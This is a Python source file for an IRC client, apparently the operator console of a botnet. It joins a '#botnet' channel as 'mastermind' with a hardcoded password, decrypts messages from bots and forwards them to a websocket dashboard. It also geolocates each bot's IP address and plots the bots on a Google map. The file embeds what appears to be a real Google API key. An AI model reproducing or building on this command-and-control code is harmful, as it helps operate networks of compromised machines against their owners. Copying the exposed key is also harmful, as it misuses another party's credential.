from twisted.words.protocols import irc
from twisted.internet import reactor, protocol
import decrypt
import requests
import json


class ChatBridge(irc.IRCClient):
    nickname = "mastermind"
    debug = False
    websocket = None
    password = "botnetpassword"

    HostList = []

    def connectionMade(self):
        irc.IRCClient.connectionMade(self)
        self.factory.websocket.connectToIRC()
        self.factory.websocket.write_message({"type": "chat",
                                              "user": "NOTICE",
                                              "message": "YOU HAVE JOINED " + self.factory.channel})

    def connectionLost(self, reason):
        irc.IRCClient.connectionLost(self, reason)

    def joined(self, channel):
        pass

    def setNick(self, nickname):
        irc.IRCClient.setNick(self, nickname)
        self.factory.nickname = nickname

    def signedOn(self):
        self.join(self.factory.channel)

    def privmsg(self, user, channel, mesg):
        ##print mesg
        ##DECRYPT MESSAGE
        mesg = decrypt.decrypt(mesg)
        ##print mesg
        if self.factory.websocket:
            self.factory.websocket.write_message({"type": "chat",
                                                  "user": user.split("!")[0],
                                                  "message": mesg})
        else:
            print ("websocket not open")

    def action(self, user, channel, mesg):
        pass

    def irc_NICK(self, prefix, params):
        pass

    def userlist(self):
        try:
            baseUrl = "http://freegeoip.net/json/"
    
            baseMap = """https://maps.googleapis.com/maps/api/staticmap?center=Portugal&zoom=2&size=1300x1300"""
            for host in self.HostList:
                j1 = requests.get(baseUrl + host)
                resp = json.loads(j1.text)
                baseMap += "&markers=color:red%7Clabel:S%7C" + str(resp["latitude"]) + "," + str(resp["longitude"])
    
            baseMap += "&key=AIzaSyBAsLov4ueoDpIddLVkwdeUprbLdUgmJtc"
        except:
            return "API not available."
        self.HostList = []
        self.who('#botnet')
        self.factory.websocket.write_message({"type": "chat",
                                              "user": "WHO",
                                              "message": str(baseMap)})

    def irc_RPL_NAMREPLY(self, *nargs):
        self.factory.websocket.write_message({"type": "chat",
                                              "user": "USERS",
                                              "message": (nargs[1][3:])})

    def irc_RPL_ENDOFNAMES(self, *nargs):
        self.who('#botnet')
        self.factory.websocket.write_message({"type": "chat",
                                              "user": "NOTICE",
                                              "message": "RUNNING"})

    def irc_unknown(self, prefix, command, params):
        if self.debug:
            print ('UNKNOWN:', prefix, command, params)

    def who(self, channel):
        "List the users in 'channel', usage: client.who('#testroom')"
        self.sendLine('WHO %s' % channel)

    def irc_RPL_WHOREPLY(self, *nargs):
        "Receive WHO reply from server"
        self.HostList.append(nargs[1][3])
        self.factory.websocket.write_message({"type": "chat",
                                              "user": "WHO",
                                              "message": str(nargs)})

    def irc_RPL_ENDOFWHO(self, *nargs):
        "Called when WHO output is complete"
        print 'WHO COMPLETE'


class ChatBridgeFactory(protocol.ClientFactory):
    bridge = None

    def __init__(self, channel):
        self.channel = channel

    def buildProtocol(self, addr):
        p = ChatBridge()
        p.factory = self
        self.bridge = p
        self.nickname = p.nickname
        return p

    def clientConnectionLost(self, connector, reason):
        """If we get disconnected, reconnect to server."""
        connector.connect()

    def clientConnectionFailed(self, connector, reason):
        print("connection failed:", reason)
        reactor.stop()
